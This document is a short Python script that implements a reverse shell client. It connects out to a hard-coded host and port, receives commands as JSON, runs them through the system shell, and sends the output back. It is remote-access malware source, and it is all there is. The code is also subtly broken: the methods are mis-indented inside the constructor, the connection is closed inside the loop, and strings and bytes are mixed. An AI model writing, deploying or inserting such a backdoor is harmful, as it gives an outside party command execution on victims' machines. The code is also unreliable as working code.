import socket
import subprocess
import json

class MySocket:
	def __init__(self, ip, port):
		self.my_connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		self.my_connection.connect((ip,port))

		def command_exe(self, command):
			return subprocess.check_output(command, shell=True)

		def json_sender(self, data):
			json_data = json.dumps(data)
			self.my_connection.send(json_data)

		def json_receiver(self):
			json_data = ""
			while True:
				try:
					json_data = json_data + self.my_connection.recv(1024)
					return json.loads(json_data)
				except ValueError:
					continue

		def start_socket(self):
			while True:
				command = self.json_receiver()
				command_output = self.command_exe(command)
				self.json_sender(command_output)
				self.my_connection.close()

my_socket_connection = MySocket("192.168.0.114",7777)
my_socket_connection.start_socket()
